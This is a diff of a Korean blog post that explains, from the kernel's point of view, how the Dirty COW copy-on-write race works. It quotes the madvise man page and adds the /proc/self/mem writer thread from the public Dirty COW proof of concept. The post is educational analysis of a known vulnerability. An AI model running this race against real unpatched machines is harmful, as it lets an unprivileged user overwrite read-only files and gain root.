@@ -22,7 +22,7 @@ tags: pwn, kernel, exploit, page, Copy-on-Write
 ---
 
 
-# Introduction
+## Introduction
 
 (Dirty COW에 대한)익스에 관한 많은 기사나 블로그 글이 있지만 정확히 Dirty COW가 커널 관점에서 어떻게 동작하는지에 대한 만족스러운 설명이 없어 포스팅을 진행하기로 했다. 
 
@@ -37,7 +37,7 @@ tags: pwn, kernel, exploit, page, Copy-on-Write
 - Page Fault
 - Copy-on-Write
 
-# How to carry out the attack
+## How to carry out the attack
 
 그럼, 처음부터 시작해보도록 하자. 우리의 궁극적인 목적은 파일에 `write`를 하는 것이지만 첫 코드에서 파일에 `open`를 호출할때 read-only인 `O_RDONLY` flag를 인자로 넣는다. 이렇게 하는 이유는 해당 파일에 쓰기권한이 없기때문에 fd를 가져올때 커널을 만족시키기 위한 것이다. 이렇게 fd를 가져오는데 성공하면 즉시 `mmap`을 호출한다.
 
@@ -90,10 +90,71 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
 }
 ```
 
-기본적으로 `madvise(MADV_DONTNEED)`는 매핑에 의해 관리되는 물리 메모리를 제거한다.
+기본적으로 `madvise(MADV_DONTNEED)`는 매핑에 의해 관리되는 물리 메모리를 제거한다. Copy-On-Write된 페이지의 경우에는 함수 호출 후 페이지가 지워진다. 그 후 사용자가 해당 메모리 영역을 다시 접근하려고 하면 파일 기반 매핑을 위해 디스크 (또는 페이지 캐시)에서 기존 내용이 다시 로드되거나 0으로 채워진 익명 힙 메모리가 로드된다.
 
+리눅스 문서를 참조해보면
 
+```
+       `MADV_DONTNEED`
+              Do not expect access in the near future.  (For the time being,
+              the application is finished with the given range, so the
+              kernel can free resources associated with it.)
 
+              After a successful MADV_DONTNEED operation, the semantics of
+              memory access in the specified region are changed: subsequent
+              accesses of pages in the range will succeed, but will result
+              in either repopulating the memory contents from the up-to-date
+              contents of the underlying mapped file (for shared file
+              mappings, shared anonymous mappings, and shmem-based
+              techniques such as System V shared memory segments) or zero-
+              fill-on-demand pages for anonymous private mappings.
+
+              Note that, when applied to shared mappings, MADV_DONTNEED
+              might not lead to immediate freeing of the pages in the range.
+              The kernel is free to delay freeing the pages until an
+              appropriate moment.  The resident set size (RSS) of the
+              calling process will be immediately reduced however.
+
+              MADV_DONTNEED cannot be applied to locked pages, Huge TLB
+              pages, or VM_PFNMAP pages.  (Pages marked with the kernel-
+              internal VM_PFNMAP flag are special memory areas that are not
+              managed by the virtual memory subsystem.  Such pages are
+              typically created by device drivers that map the pages into
+              user space.)
+```
+
+라고 되어있다. 리눅스에서 `MADV_DONTNEED`의 동작은 사실 논란의 여지가 있고 POSIX 표준 1을 준수하지 않는다. 곧 알 수 있겠지만 실제로 이 동작 때문에 Dirty COW exploit이 가능해진다.
+
+그럼 다른 쓰레드를 살펴보자.
+
+```c
+void *procselfmemThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    /*
+       You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+       >  The in the wild exploit we are aware of doesn't work on Red Hat
+       >  Enterprise Linux 5 and 6 out of the box because on one side of
+       >  the race it writes to /proc/self/mem, but /proc/self/mem is not
+       >  writable on Red Hat Enterprise Linux 5 and 6.
+     */
+    int f=open("/proc/self/mem",O_RDWR);
+    int i,c=0;
+    for(i=0;i<100000000;i++) {
+        /*
+           You have to reset the file pointer to the memory position.
+         */
+        lseek(f,(uintptr_t) map,SEEK_SET);
+        c+=write(f,str,strlen(str));
+    }
+    printf("procselfmem %d\n\n", c);
+}
+```
+
+먼저 `lseek`으로 `map`의 주소를 세팅한다. 그리고 아마 읽기 전용일 파일의 메모리 매핑에 속한 메모리 영역을 직접 수정을 하기 위해 `wirte`를 호출한다..?? 그리고나선 어떻게 해서든 그 수정된 것이 읽기 권한밖에 없는 파일에 전달되겠지..? 진심... 어떻게..??
+
+## `write` on `/proc/{pid}/mem`
 
 
 
